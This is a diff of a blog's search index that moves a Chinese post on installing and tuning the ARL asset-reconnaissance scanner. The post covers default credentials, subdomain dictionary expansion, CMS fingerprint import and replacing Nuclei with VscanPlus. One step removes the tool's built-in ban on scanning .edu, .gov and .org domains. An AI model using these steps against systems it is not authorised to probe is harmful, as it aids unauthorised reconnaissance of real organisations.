-<p>“keyword”代表关键词识别，通过检索网站 HTML 的 body 或 title 中关键词来识别网站所使用的 CMS；<br>“faviconhash”代表哈希识别，通过对比网站的 favicon 图标哈希值来识别网站使用的 CMS。</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207163621435.png" class title="image-20241207163621435">
-
-<p>当收集到更多指纹字典时，可以参考 finger.json 的格式来批量导入指纹</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ARl-Finger-ADD.py https://192.168.1.1:5003/ admin password</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207170140942.png" class title="image-20241207170140942">
-
-
-
-<h3 id="文件泄露检测功能优化"><a href="#文件泄露检测功能优化" class="headerlink" title="文件泄露检测功能优化"></a>文件泄露检测功能优化</h3><p>源代码在 &#x2F;code&#x2F;app&#x2F;servers&#x2F;fileLeak.py</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207173344511.png" class title="image-20241207173344511">
-
-<p>增加扫描的线程数</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207173830637.png" class title="image-20241207173830637">
-
-<p>当域名较多时候会出现任务卡死的BUG，增加 try-except 错误处理机制，当检测超时时则返回状态码 404，防⽌服务器响应时间过长导致的长时间堵塞</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207174423021.png" class title="image-20241207174423021">
-
-
-
-<h3 id="漏扫轻量化"><a href="#漏扫轻量化" class="headerlink" title="漏扫轻量化"></a>漏扫轻量化</h3><p>Nuclei 的核心逻辑是通过大量的 POC 模板 进行扫描，这种操作可能会对目标系统造成比较大的负面影响。</p>
-<p>通过增加轻型扫描工具，让灯塔系统更加完整，这里采用 Vscan 二开版本，选择合适的版本下载并上传至 Linux 服务器</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/youki992/VscanPlus</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207214440691.png" class title="image-20241207214440691">
-
-<p>nuclei 相关代码在 &#x2F;code&#x2F;app&#x2F;servers&#x2F;nuclei_scan.py，逐步修改源码</p>
-<p>添加 VscanPlus 的结果保存地址</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207214814259.png" class title="image-20241207214814259">
-
-<p>在将 Nuclei 扫描替换为 VscanPlus 扫描时，VscanPlus 的 JSON 结果中包含以下关键字段：</p>
-<p>“POC”：对应扫描中使用的漏洞验证命令（POC）。</p>
-<p>“file-fuzz”：记录扫描过程中检测到的文件路径或目录地址。</p>
-<p>“technologies”：表示扫描过程中识别到的指纹信息（如CMS、服务器类型等）。</p>
-<p>其余字段与 Nuclei 输出相同，无需修改。通过调整扫描执行和结果处理逻辑，可以无缝集成 Vscan 扫描。</p>
-<p>修改读写逻辑</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207214926165.png" class title="image-20241207214926165">
-
-<p>修改运行命令</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207215013596.png" class title="image-20241207215013596">
-
-<p>ARL的 docker 中没有安装 libpcap 包，需要安装并添加软链接</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install libpcap</span><br><span class="line">ln -s /usr/lib64/libpcap.so.1.5.3 /usr/lib64/libpcap.so.0.8</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207215606686.png" class title="image-20241207215606686">
-
-<p>测试，运行成功</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207215633273.png" class title="image-20241207215633273">
-
-<p>最后在 ARL 中测试运行正常</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207221139221.png" class title="image-20241207221139221">
-
-
-
-]]></content>
-      <categories>
-        <category>安全工具</category>
-      </categories>
-      <tags>
-        <tag>安全工具</tag>
       </tags>
   </entry>
   <entry>
@@ -1193,6 +1074,124 @@
       </categories>
       <tags>
         <tag>Java安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>资产侦察系统灯塔ARL优化</title>
+    <url>/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/</url>
+    <content><![CDATA[<h2 id="灯塔介绍与安装"><a href="#灯塔介绍与安装" class="headerlink" title="灯塔介绍与安装"></a>灯塔介绍与安装</h2><p>灯塔一般用于自动化安全扫描，帮助发现和修复安全漏洞，适用于 Web 应用、API、安全配置等多个领域。它通过快速、全面的扫描和详细的报告，帮助开发人员、运维人员等及时了解并解决安全问题。</p>
+<p><strong>初始账号密码：</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin/arlpass</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207111703756.png" class title="image-20241207111703756">
+
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>选择灯塔魔改版下载，ARL-Puls 是基于灯塔ARL修改后的版本。相比原版，增加了OneForAll、中央<a class="link" href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020">数据库<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，修改了altDns。</p>
+<p>Github地址：<a class="link" href="https://github.com/ki9mu/ARL-plus-docker">https://github.com/ki9mu/ARL-plus-docker<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>下载上传或克隆</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ki9mu/ARL-plus-docker</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>修改域名禁止项</p>
+<p>灯塔中指定了无法扫描域名后缀 .edu .gov .org，开启 Docker 之前修改为不存在域名</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207102624762.png" class title="image-20241207102624762">
+
+<p>修改后</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207102529258.png" class title="image-20241207102529258">
+
+<p>配置 Fofa API</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207103449345.png" class title="image-20241207103449345">
+
+
+
+<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>先添加 Docker 数据卷</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker volume create --name=arl_db</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207105634491.png" class title="image-20241207105634491">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207111459771.png" class title="image-20241207111459771">
+
+
+
+<h2 id="优化增强"><a href="#优化增强" class="headerlink" title="优化增强"></a>优化增强</h2><h3 id="子域名字典扩容"><a href="#子域名字典扩容" class="headerlink" title="子域名字典扩容"></a>子域名字典扩容</h3><p>灯塔自带的字典仅包含两万个子域名，依赖这个字典进行扫描往往会漏掉一些潜在的子域名</p>
+<p>将准备好的子域名字典复制到 arl_worker 中，使⽤如下命令：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp domain_2w.txt ID:/code/app/dicts/domain_2w.txt</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207114224079.png" class title="image-20241207114224079">
+
+
+
+<h3 id="指纹增强"><a href="#指纹增强" class="headerlink" title="指纹增强"></a>指纹增强</h3><p>添加指纹，让灯塔拥有更强大的指纹，参考使用 ARL-Finger-ADD</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/loecho-sec/ARL-Finger-ADD</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207120427341.png" class title="image-20241207120427341">
+
+<p>脚本主要实现的功能是通过读取 finger.json 中的数据，向灯塔系统批量添加指纹信息	</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207163319548.png" class title="image-20241207163319548">
+
+<p>“keyword”代表关键词识别，通过检索网站 HTML 的 body 或 title 中关键词来识别网站所使用的 CMS；<br>“faviconhash”代表哈希识别，通过对比网站的 favicon 图标哈希值来识别网站使用的 CMS。</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207163621435.png" class title="image-20241207163621435">
+
+<p>当收集到更多指纹字典时，可以参考 finger.json 的格式来批量导入指纹</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ARl-Finger-ADD.py https://192.168.1.1:5003/ admin password</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207170140942.png" class title="image-20241207170140942">
+
+
+
+<h3 id="文件泄露检测功能优化"><a href="#文件泄露检测功能优化" class="headerlink" title="文件泄露检测功能优化"></a>文件泄露检测功能优化</h3><p>源代码在 &#x2F;code&#x2F;app&#x2F;servers&#x2F;fileLeak.py</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207173344511.png" class title="image-20241207173344511">
+
+<p>增加扫描的线程数</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207173830637.png" class title="image-20241207173830637">
+
+<p>当域名较多时候会出现任务卡死的BUG，增加 try-except 错误处理机制，当检测超时时则返回状态码 404，防⽌服务器响应时间过长导致的长时间堵塞</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207174423021.png" class title="image-20241207174423021">
+
+
+
+<h3 id="漏扫轻量化"><a href="#漏扫轻量化" class="headerlink" title="漏扫轻量化"></a>漏扫轻量化</h3><p>Nuclei 的核心逻辑是通过大量的 POC 模板 进行扫描，这种操作可能会对目标系统造成比较大的负面影响。</p>
+<p>通过增加轻型扫描工具，让灯塔系统更加完整，这里采用 Vscan 二开版本，选择合适的版本下载并上传至 Linux 服务器</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/youki992/VscanPlus</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207214440691.png" class title="image-20241207214440691">
+
+<p>nuclei 相关代码在 &#x2F;code&#x2F;app&#x2F;servers&#x2F;nuclei_scan.py，逐步修改源码</p>
+<p>添加 VscanPlus 的结果保存地址</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207214814259.png" class title="image-20241207214814259">
+
+<p>在将 Nuclei 扫描替换为 VscanPlus 扫描时，VscanPlus 的 JSON 结果中包含以下关键字段：</p>
+<p>“POC”：对应扫描中使用的漏洞验证命令（POC）。</p>
+<p>“file-fuzz”：记录扫描过程中检测到的文件路径或目录地址。</p>
+<p>“technologies”：表示扫描过程中识别到的指纹信息（如CMS、服务器类型等）。</p>
+<p>其余字段与 Nuclei 输出相同，无需修改。通过调整扫描执行和结果处理逻辑，可以无缝集成 Vscan 扫描。</p>
+<p>修改读写逻辑</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207214926165.png" class title="image-20241207214926165">
+
+<p>修改运行命令</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207215013596.png" class title="image-20241207215013596">
+
+<p>ARL的 docker 中没有安装 libpcap 包，需要安装并添加软链接</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install libpcap</span><br><span class="line">ln -s /usr/lib64/libpcap.so.1.5.3 /usr/lib64/libpcap.so.0.8</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207215606686.png" class title="image-20241207215606686">
+
+<p>测试，运行成功</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207215633273.png" class title="image-20241207215633273">
+
+<p>最后在 ARL 中测试运行正常</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207221139221.png" class title="image-20241207221139221">
+
+
+
+]]></content>
+      <categories>
+        <category>安全工具</category>
+      </categories>
+      <tags>
+        <tag>安全工具</tag>
       </tags>
   </entry>
 </search>
